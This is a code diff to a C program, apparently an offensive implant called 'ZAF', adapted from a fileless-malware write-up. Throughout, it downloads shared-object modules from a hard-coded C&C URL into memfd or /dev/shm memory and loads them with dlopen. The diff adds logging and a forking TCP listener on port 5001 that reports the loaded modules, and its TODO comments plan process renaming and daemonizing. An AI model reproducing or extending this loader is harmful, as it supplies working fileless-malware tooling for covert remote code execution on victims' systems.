@@ -1,19 +1,38 @@
-/* from https://x-c3ll.github.io/posts/fileless-memfd_create */
+/* 
+ *
+ *
+ *   ZAF:
+ *
+ *
+ *
+ *
+ *
+ *
+ *
+ * Ref: some code from https://x-c3ll.github.io/posts/fileless-memfd_create */
 
 #define _GNU_SOURCE
 
 
+#include <stdio.h>
 #include <curl/curl.h>
+#include <cJSON.h>
 #include <dlfcn.h>
 #include <fcntl.h>
-#include <stdio.h>
+#include <netinet/in.h>
+#include <netdb.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
+#include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
+#include <sys/socket.h>
 #include <sys/utsname.h>
+#include <netinet/tcp.h>
 #include <unistd.h>
+#include <errno.h>
+
 
 #include "zaf.h"
 
@@ -85,11 +104,11 @@ static size_t write_data (void *ptr, size_t size, size_t nmemb, void* userp) {
 
     Shared_Mem_Fd *shm_fd_s = (Shared_Mem_Fd *)userp;
 	if (write(shm_fd_s->shm_fd, ptr, nmemb) < 0) {
-		fprintf(stderr, "[-] Could not write file :'(\n");
+		log_fatal("Could not write shm file.");
 		close(shm_fd_s->shm_fd);
-		exit(-1);
+		return 1;
 	}
-	printf("[+] File written!\n");
+	log_debug("SHM file written");
 }
 
 // Download our share object from a C&C via HTTPs
@@ -99,12 +118,12 @@ int download_to_RAM(char *download) {
 	int shm_fd;
 
 	shm_fd = open_ramfs(); // Give me a file descriptor to memory
-	printf("[+] File Descriptor %d Shared Memory created!\n", shm_fd);
+	log_info("File Descriptor %d Shared Memory created!", shm_fd);
 
     Shared_Mem_Fd shm_fd_s = {0};
     shm_fd_s.shm_fd=shm_fd;
 
-	printf("[+] URL for cURL: %s\n", download);
+	log_debug("Passing URL to cURL: %s", download);
 
     curl_global_init(CURL_GLOBAL_DEFAULT);    
 	// We use cURL to download the file
@@ -122,7 +141,7 @@ int download_to_RAM(char *download) {
 		// Do the HTTPs request!
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
-			fprintf(stderr, "[-] cURL failed: %s\n", curl_easy_strerror(res));
+			log_error("cURL failed: %s", curl_easy_strerror(res));
 			close(shm_fd);
             shm_fd=0;
 		}
@@ -136,42 +155,42 @@ void load_so(int shm_fd) {
 	char path[1024];
 	void *handle;
 
-	printf("[+] Trying to load Shared Object!\n");
+	log_debug("Trying to load Shared Object");
 	if (kernel_version() == 1) { //Funky way
-	    printf("[.] yay, memfd supported.\n");
+	    log_debug("memfd_create() is supported.");
 		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
 	} else { // Not funky way :(
 		close(shm_fd);
 		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
-	    printf("[.] hmm, only shm supported.\n");
+	    log_debug("only /dev/shm supported.");
 	}
-    printf("Path: %s\n", path);
+    log_debug("Path to fd: %s", path);
 	handle = dlopen(path, RTLD_LAZY);
 	if (!handle) {
-		fprintf(stderr,"[-] Dlopen failed with error: %s\n", dlerror());
+		log_error("Dlopen failed with error: %s", dlerror());
 	}
 }
 
 // Get memfd location 
-int createMemfdTbl(int shm_fd, char* mname) {
+int setMemfdTbl(int shm_fd, char* mname) {
     char path[1024];
     void *handle;
     
 
-    printf("[+] Creating Index Table\n");
+    log_debug("Populating Index Table");
     if (kernel_version() == 1) { //Funky way
-        printf("[.] yay, memfd supported.\n");
+	    log_debug("memfd_create() is supported.");
         snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
     } else { // Not funky way :(
         close(shm_fd);
         snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
-        printf("[.] hmm, only shm supported.\n");
+	    log_debug("only /dev/shm supported.");
     }
     if (check_empty(head) == 0) {
-        printf("[.] Head empty\n");
-        head = malloc(sizeof(node_t));
+        log_debug("Head of list empty");
+        head = calloc(1,sizeof(node_t));
         if (head == NULL) {
-		    fprintf(stderr,"[-] malloc() failed\n");
+		    log_fatal("calloc() failed");
             return 1;
         }
         push_first(head, path, mname);
@@ -182,44 +201,180 @@ int createMemfdTbl(int shm_fd, char* mname) {
 
 
 int main (int argc, char **argv) {
+    FILE *fp;
     char *modules[2] = {"libmctor.so", "hax.so"};
     char *ccurl="http://127.0.0.1:8080/";
-    char urlbuf[255];
+    char *logFile="/tmp/_mf.log";
+    char urlbuf[255] = {'\0'};
 	int fd;
     int i;
 
-	printf("[+] Trying to reach C&C & start download...\n");
+    log_info("Opening log file: %s", logFile);
+    fp = fopen (logFile,"w");
+    if (fp == NULL) {
+        log_error("File not created okay, errno = %d", errno);
+    }else{
+        log_set_fp(fp);
+    }
+
+	log_debug("\n\n=== ZAF ===\n");
+	log_debug("Trying for C2 download...");
     for(i = 0; i < 2; i++)
     {
         snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
-        printf("URL = %s \n", urlbuf);
+        log_debug("Module URL = %s", urlbuf);
         fd = download_to_RAM(urlbuf);
         if (fd != 0){
-            createMemfdTbl(fd, modules[i]);
+            setMemfdTbl(fd, modules[i]);
         }
 
     }
 
-    print_list(head);
-
+    // TODO: SIGHUP/SIGINT/SIGTERM
+    // TODO: ps rename
+    // TODO: daemonaize
+    setupCmdP();
     //load_so(fd, fd_s);
-
-    sleep(1000000);
+    fclose (fp);
 	exit(0);
 }
 
+int setupCmdP(){
+    int flag;
+    char * cmdName;
+
+
+    char buf[MAX_BUF];
+    int sockfd, newsockfd, portno, clilen;
+    struct sockaddr_in serv_addr, cli_addr;
+    int n, pid;
+    int one = 1;
+
+       /* First call to socket() function */
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (sockfd < 0) {
+      log_error("ERROR opening socket");
+      return -1;
+    }
+
+    /* Initialize socket structure */
+    bzero((char *) &serv_addr, sizeof(serv_addr));
+    portno = 5001;
+
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = INADDR_ANY;
+    serv_addr.sin_port = htons(portno);
+
+    /* Now bind the host address using bind() call.*/
+    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
+      log_error("ERROR on binding");
+      return -1;
+    }
+
+    /* Now start listening for the clients, here
+      * process will go in sleep mode and will wait
+      * for the incoming connection
+    */
+
+    setsockopt(sockfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
+    listen(sockfd,5);
+    clilen = sizeof(cli_addr);
+
+
+    while (1) {
+      log_info("Accepting requests");
+      newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
+
+      if (newsockfd < 0) {
+         log_error("ERROR on accept");
+         return -1;
+      }
+
+      /* Create child process */
+      pid = fork();
+
+      if (pid < 0) {
+         perror("ERROR on fork");
+         return -1;
+      }
+
+      if (pid == 0) {
+         /* This is the client process */
+         close(sockfd);
+         doprocessing(newsockfd, head);
+         exit(0);
+      }
+      else {
+         close(newsockfd);
+      }
+
+      //doprocessing(newsockfd, head);
+
+    } /* end of while */
+
+    return 0;
+}
+
+
+int doprocessing (int sock, node_t * head) {
+   int n, head_sz;
+   char buffer[MAX_BUF];
+   bzero(buffer,MAX_BUF);
+   n = read(sock,buffer,MAX_BUF-1);
+
+   if (n < 0) {
+      log_error("ERROR reading from socket");
+      return -1;
+   }
+
+   log_info("In: %s\n",buffer);
+   write_modlist(head, sock);
+
+   return 0;
+
+}
+// ------------------- Node table ----------------
 int check_empty(node_t * head){
     int empty  = (head == NULL) ? 0 : 1;
     return empty;
 }
 
+int list_sz(node_t * head) {
+    node_t * current = head;
+    int c = 1;
+    while (current != NULL) {
+        c++;
+        current = current->next;
+    }
+    return c;
+}
+void write_modlist(node_t * head, int sock) {
+    node_t * current = head;
+    int offset = 0, n;
+    char * entry;
+
+
+    while (current != NULL) {
+        entry = calloc(1, MAX_BUF);
+		snprintf(entry, MAX_BUF-1, "%s - %s\n", current->mpath, current->mname);
+
+        n = write(sock,entry,strlen(entry));
+
+        if (n < 0) {
+          log_error("ERROR writing to socket");
+        }
+        free(entry);
+        current = current->next;
+    }
+}
 void print_list(node_t * head) {
     node_t * current = head;
     int c = 1;
 
     printf("\n=== \n");
     while (current != NULL) {
-        printf("%d: %s - %s\n", c, current->mname, current->mpath);
+        printf("%d: %s - %s\n", c, current->mpath, current->mname);
         current = current->next;
         c++;
     }
@@ -227,31 +382,30 @@ void print_list(node_t * head) {
 
 int push_first(node_t * head, char* path, char* mname) {
 
-    printf("[.] Adding path: %s, strlen(path): %d name: %s strlen(name): %d\n", path, strlen(path), mname, strlen(mname));
+    log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));
     strncpy(head->mpath, path, strlen(path));
     strncpy(head->mname, mname, strlen(mname));
     head->next = NULL;
-    printf("[.] %s : %s\n", head->mname, head->mpath);
+    log_debug("ModTable: Added: %s : %s\n", head->mname, head->mpath);
 }
 
 int push(node_t * head, char* path, char* mname) {
     node_t * current = head;
 
-    printf("[.] Adding path: %s, strlen(path): %d name: %s strlen(name): %d\n", path, strlen(path), mname, strlen(mname));
-
+    log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));
 
     while (current->next != NULL) {
         current = current->next;
     }
 
-    current->next = malloc(sizeof(node_t));
+    current->next = calloc(1,sizeof(node_t));
     if (current == NULL) {
+        log_fatal("ModTable: calloc() failed");
         return 1;
     }
 
     strncpy(current->next->mpath, path, strlen(path));
     strncpy(current->next->mname, mname, strlen(mname));
     current->next->next = NULL;
-    printf("[.] %s : %s\n", current->mname, current->mpath);
+    log_debug("ModTable: entry: %s : %s", current->mname, current->mpath);
 }
-
